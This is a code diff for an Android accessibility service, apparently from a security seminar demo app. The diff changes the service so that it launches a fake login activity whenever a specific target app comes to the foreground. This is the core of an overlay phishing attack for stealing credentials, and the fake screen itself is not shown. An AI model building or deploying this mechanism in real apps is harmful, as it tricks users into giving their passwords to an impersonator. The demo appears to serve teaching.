@@ -1,6 +1,7 @@
 package com.example.fakeapp
 
 import android.accessibilityservice.AccessibilityService
+import android.app.ActivityOptions
 import android.content.Intent
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
@@ -108,7 +109,7 @@ class LoggerAccessibilityService : AccessibilityService() {
     private lateinit var windowManager: WindowManager
     private lateinit var overlayView: View
     private lateinit var params: WindowManager.LayoutParams
-
+    private var fakeLoginShowing = false
     private var screenHeight = 0
     private var overlayShowing = false
 
@@ -127,10 +128,28 @@ class LoggerAccessibilityService : AccessibilityService() {
         if (pkg == packageName) return
 
         if (pkg == "com.example.cs426_seminar_app") {
-            showOverlay()
-        } else {
-            hideOverlay()
+
+            openFakeLogin()
         }
+    }
+
+    private fun openFakeLogin(){
+        if(fakeLoginShowing)
+            return
+
+
+        fakeLoginShowing = true
+        val intent = Intent(
+            this,
+            FakeLoginActivity::class.java
+        )
+
+        intent.addFlags(
+            Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or  Intent.FLAG_ACTIVITY_CLEAR_TOP
+        )
+
+        startActivity(intent)
+        
     }
 
     override fun onServiceConnected() {
